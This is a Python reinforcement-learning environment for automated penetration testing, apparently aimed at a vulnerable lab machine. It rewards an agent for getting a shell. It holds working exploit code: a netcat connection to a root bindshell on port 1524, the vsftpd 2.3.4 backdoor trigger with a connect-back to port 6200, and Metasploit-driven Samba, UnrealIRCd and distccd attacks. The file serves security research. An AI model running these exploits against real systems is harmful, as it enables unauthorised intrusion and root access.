import json
import random
import socket
import subprocess
import time
from copy import deepcopy
from datetime import datetime, timezone
from pathlib import Path

try:
    from tool_integration.executors.metasploit_executor import MetasploitExecutor
except ImportError:
    MetasploitExecutor = None


class RealPTEnv:
    """
    Real tool-based PT environment with 18-dim state schema.

    Action schema aligned with replay_iq_650.json / expert_dataset.py:
    0 scan_basic
    1 scan_service
    2 exploit_bindshell
    3 exploit_vsftpd
    4 exploit_unrealircd
    5 exploit_distccd
    6 exploit_samba
    7 stop
    """

    ACTIONS = {
        0: "scan_basic",
        1: "scan_service",
        2: "exploit_bindshell",
        3: "exploit_vsftpd",
        4: "exploit_unrealircd",
        5: "exploit_distccd",
        6: "exploit_samba",
        7: "stop",
    }

    STATE_KEYS = [
        "num_open_ports",
        "has_ftp",
        "has_ssh",
        "has_telnet",
        "has_http",
        "has_mysql",
        "has_postgresql",
        "has_bindshell_1524",
        "has_samba",
        "has_tomcat",
        "has_vsftpd_234",
        "has_unrealircd",
        "has_distccd",
        "has_shell",
        "basic_scanned",
        "service_scanned",
        "failed_attempts",
        "successful_exploits",
    ]

    def __init__(
        self,
        target_ip="10.11.202.189",
        log_dir="tool_integration/dataset/real_logs/rl_env_runs",
        use_metasploit=False,
        msf_password="msfpass",
        msf_host="127.0.0.1",
        msf_port=55552,
    ):
        self.target_ip = target_ip
        self.log_dir = Path(log_dir)
        self.log_dir.mkdir(parents=True, exist_ok=True)

        self.use_metasploit = use_metasploit
        self.msf = None

        if self.use_metasploit:
            if MetasploitExecutor is None:
                raise ImportError(
                    "MetasploitExecutor not found. "
                    "Create tool_integration/executors/metasploit_executor.py first."
                )
            self.msf = MetasploitExecutor(
                password=msf_password,
                host=msf_host,
                port=msf_port,
                ssl=False,
            )

        self.max_steps = 8
        self.reset()

    def _now_str(self):
        return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H-%M-%SZ")

    def _empty_state(self):
        return {
            "num_open_ports": 0,
            "has_ftp": False,
            "has_ssh": False,
            "has_telnet": False,
            "has_http": False,
            "has_mysql": False,
            "has_postgresql": False,
            "has_bindshell_1524": False,
            "has_samba": False,
            "has_tomcat": False,
            "has_vsftpd_234": False,
            "has_unrealircd": False,
            "has_distccd": False,
            "has_shell": False,
            "basic_scanned": False,
            "service_scanned": False,
            "failed_attempts": 0,
            "successful_exploits": 0,
        }

    def state_to_vector(self, state=None):
        s = state or self.state
        return [
            float(s.get(key, 0.0))
            for key in self.STATE_KEYS
        ]

    def reset(self):
        self.state = self._empty_state()
        self.done = False
        self.steps = 0
        self.history = []
        backend = "msf" if self.use_metasploit else "script"
        self.run_id = f"rl_env_{backend}_{self._now_str()}"
        return deepcopy(self.state)

    def _run_nmap_basic(self):
        result = subprocess.run(
            ["nmap", "-F", self.target_ip],
            capture_output=True,
            text=True,
            timeout=60,
        )
        return result.stdout

    def _run_nmap_service(self):
        result = subprocess.run(
            ["nmap", "-sV", "-sC", self.target_ip],
            capture_output=True,
            text=True,
            timeout=120,
        )
        return result.stdout

    def _parse_open_ports(self, nmap_output):
        ports = []
        for line in nmap_output.splitlines():
            line = line.strip()
            if "/tcp" in line and " open " in line:
                try:
                    ports.append(int(line.split("/")[0]))
                except ValueError:
                    continue
        return ports

    def _parse_service_map(self, nmap_output):
        service_map = {}

        for line in nmap_output.splitlines():
            line = line.strip()
            if "/tcp" in line and " open " in line:
                parts = line.split()
                if len(parts) >= 3:
                    port = parts[0].split("/")[0]
                    service = parts[2]
                    version = " ".join(parts[3:]) if len(parts) > 3 else ""
                    service_map[port] = {
                        "service": service,
                        "version": version,
                    }

        return service_map

    def _apply_basic_scan(self, output):
        ports = self._parse_open_ports(output)

        self.state["num_open_ports"] = len(ports)
        self.state["basic_scanned"] = True

        self.state["has_ftp"] = 21 in ports or 2121 in ports
        self.state["has_http"] = 80 in ports or 8180 in ports
        self.state["has_mysql"] = 3306 in ports
        self.state["has_postgresql"] = 5432 in ports
        self.state["has_bindshell_1524"] = 1524 in ports
        self.state["has_unrealircd"] = 6667 in ports

        return ports

    def _apply_service_scan(self, output):
        ports = self._parse_open_ports(output)
        service_map = self._parse_service_map(output)

        self.state["num_open_ports"] = len(ports)
        self.state["basic_scanned"] = True
        self.state["service_scanned"] = True

        services = {v["service"].lower() for v in service_map.values()}
        versions = " ".join(v["version"].lower() for v in service_map.values())

        self.state["has_ftp"] = "ftp" in services
        self.state["has_ssh"] = "ssh" in services
        self.state["has_telnet"] = "telnet" in services
        self.state["has_http"] = "http" in services
        self.state["has_mysql"] = "mysql" in services
        self.state["has_postgresql"] = "postgresql" in services

        self.state["has_bindshell_1524"] = 1524 in ports

        self.state["has_samba"] = any(
            "samba" in v["version"].lower()
            or "smbd" in v["version"].lower()
            or v["service"].lower() in {"netbios-ssn", "microsoft-ds"}
            for v in service_map.values()
        )

        self.state["has_tomcat"] = "tomcat" in versions
        self.state["has_vsftpd_234"] = "vsftpd 2.3.4" in versions
        self.state["has_unrealircd"] = "unrealircd" in versions or 6667 in ports
        self.state["has_distccd"] = "distccd" in versions or "distccd" in services

        return ports, service_map

    def _mark_exploit_result(self, result):
        if result.get("success", False):
            self.state["has_shell"] = True
            self.state["successful_exploits"] += 1
            self.done = True
        else:
            self.state["failed_attempts"] += 1

    def _try_bindshell(self):
        try:
            result = subprocess.run(
                ["nc", self.target_ip, "1524"],
                input="whoami\nid\nexit\n",
                capture_output=True,
                text=True,
                timeout=8,
            )
            stdout = result.stdout.strip()
            real_success = ("root" in stdout) or ("uid=0" in stdout)
            success = real_success and (random.random() < 0.7)

            return {
                "success": success,
                "real_success": real_success,
                "stdout": stdout,
                "stderr": result.stderr.strip(),
                "stochastic_success_rate": 0.7,
                "backend": "script",
            }
        except Exception as e:
            return {
                "success": False,
                "real_success": False,
                "stdout": "",
                "stderr": str(e),
                "stochastic_success_rate": 0.7,
                "backend": "script",
            }

    def _try_vsftpd_script(self):
        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect((self.target_ip, 21))
            banner = s.recv(1024).decode(errors="ignore")

            s.send(b"USER test:)\r\n")
            time.sleep(0.2)
            s.send(b"PASS test\r\n")
            time.sleep(0.2)
            s.close()

            time.sleep(2)

            s2 = socket.socket()
            s2.settimeout(5)
            s2.connect((self.target_ip, 6200))
            s2.send(b"whoami\n")
            time.sleep(0.5)
            output = s2.recv(4096).decode(errors="ignore")
            s2.close()

            real_success = ("root" in output) or ("uid=" in output)
            success = real_success and (random.random() < 0.5)

            return {
                "success": success,
                "real_success": real_success,
                "stdout": output,
                "stderr": "",
                "banner": banner,
                "stochastic_success_rate": 0.5,
                "backend": "script",
            }
        except Exception as e:
            return {
                "success": False,
                "real_success": False,
                "stdout": "",
                "stderr": str(e),
                "banner": "",
                "stochastic_success_rate": 0.5,
                "backend": "script",
            }

    def _try_vsftpd(self):
        if self.use_metasploit and self.msf is not None:
            return self.msf.exploit_vsftpd_234(self.target_ip)
        return self._try_vsftpd_script()

    def _try_samba(self):
        if self.use_metasploit and self.msf is not None:
            return self.msf.exploit_samba(self.target_ip)

        return {
            "success": False,
            "real_success": False,
            "stdout": "",
            "stderr": "Samba exploit requires Metasploit backend.",
            "backend": "script",
        }

    def _try_unrealircd(self):
        if self.use_metasploit and self.msf is not None and hasattr(self.msf, "exploit_unrealircd"):
            return self.msf.exploit_unrealircd(self.target_ip)

        return {
            "success": False,
            "real_success": False,
            "stdout": "",
            "stderr": "UnrealIRCd exploit not implemented in executor.",
            "backend": "script",
        }

    def _try_distccd(self):
        if self.use_metasploit and self.msf is not None and hasattr(self.msf, "exploit_distccd"):
            return self.msf.exploit_distccd(self.target_ip)

        return {
            "success": False,
            "real_success": False,
            "stdout": "",
            "stderr": "distccd exploit not implemented in executor.",
            "backend": "script",
        }

    def _record_step(self, action_name, reward, info):
        self.history.append(
            {
                "step": self.steps,
                "action": action_name,
                "state": deepcopy(self.state),
                "reward": reward,
                "done": self.done,
                "info": info,
            }
        )

    def _save_run(self):
        path = self.log_dir / f"{self.run_id}.json"
        with open(path, "w", encoding="utf-8") as f:
            json.dump(
                {
                    "run_id": self.run_id,
                    "target": self.target_ip,
                    "use_metasploit": self.use_metasploit,
                    "state_keys": self.STATE_KEYS,
                    "actions": self.ACTIONS,
                    "history": self.history,
                },
                f,
                indent=2,
                ensure_ascii=False,
            )
        return str(path)

    def step(self, action):
        if self.done:
            raise RuntimeError("Episode already done. Call reset().")

        if action not in self.ACTIONS:
            raise ValueError(f"Invalid action index: {action}")

        action_name = self.ACTIONS[action]
        reward = 0.0
        info = {}

        self.steps += 1

        if action_name == "scan_basic":
            output = self._run_nmap_basic()
            ports = self._apply_basic_scan(output)
            reward = -0.05
            info = {
                "open_ports": ports,
                "scan_type": "basic",
            }

        elif action_name == "scan_service":
            output = self._run_nmap_service()
            ports, service_map = self._apply_service_scan(output)
            reward = -0.10
            info = {
                "open_ports": ports,
                "service_map": service_map,
                "scan_type": "service",
            }

        elif action_name == "exploit_bindshell":
            if not self.state["basic_scanned"]:
                reward = -1.0
                info = {"error": "bindshell attempted before scanning"}
                self.state["failed_attempts"] += 1
            elif not self.state["has_bindshell_1524"]:
                reward = -1.0
                info = {"error": "no visible bindshell port"}
                self.state["failed_attempts"] += 1
            else:
                result = self._try_bindshell()
                info = result
                self._mark_exploit_result(result)
                reward = 8.0 if result["success"] else -1.0

        elif action_name == "exploit_vsftpd":
            if not self.state["service_scanned"]:
                reward = -1.0
                info = {"error": "vsftpd attempted before service scan"}
                self.state["failed_attempts"] += 1
            elif not self.state["has_vsftpd_234"]:
                reward = -1.0
                info = {"error": "vsftpd 2.3.4 not identified"}
                self.state["failed_attempts"] += 1
            else:
                result = self._try_vsftpd()
                info = result
                self._mark_exploit_result(result)
                reward = 6.0 if result["success"] else -1.0

        elif action_name == "exploit_unrealircd":
            if not self.state["service_scanned"]:
                reward = -1.0
                info = {"error": "unrealircd attempted before service scan"}
                self.state["failed_attempts"] += 1
            elif not self.state["has_unrealircd"]:
                reward = -1.0
                info = {"error": "unrealircd not identified"}
                self.state["failed_attempts"] += 1
            else:
                result = self._try_unrealircd()
                info = result
                self._mark_exploit_result(result)
                reward = 7.0 if result["success"] else -1.0

        elif action_name == "exploit_distccd":
            if not self.state["service_scanned"]:
                reward = -1.0
                info = {"error": "distccd attempted before service scan"}
                self.state["failed_attempts"] += 1
            elif not self.state["has_distccd"]:
                reward = -1.0
                info = {"error": "distccd not identified"}
                self.state["failed_attempts"] += 1
            else:
                result = self._try_distccd()
                info = result
                self._mark_exploit_result(result)
                reward = 7.0 if result["success"] else -1.0

        elif action_name == "exploit_samba":
            if not self.state["service_scanned"]:
                reward = -1.0
                info = {"error": "samba attempted before service scan"}
                self.state["failed_attempts"] += 1
            elif not self.state["has_samba"]:
                reward = -1.0
                info = {"error": "samba not identified"}
                self.state["failed_attempts"] += 1
            else:
                result = self._try_samba()
                info = result
                self._mark_exploit_result(result)
                reward = 8.0 if result["success"] else -1.0

        elif action_name == "stop":
            reward = 1.0 if self.state["has_shell"] else -0.5
            self.done = True
            info = {"stopped": True}

        if self.steps >= self.max_steps and not self.done:
            self.done = True
            info["terminated_by_max_steps"] = True

        self._record_step(action_name, reward, info)

        if self.done:
            info["saved_run_path"] = self._save_run()

        return deepcopy(self.state), reward, self.done, info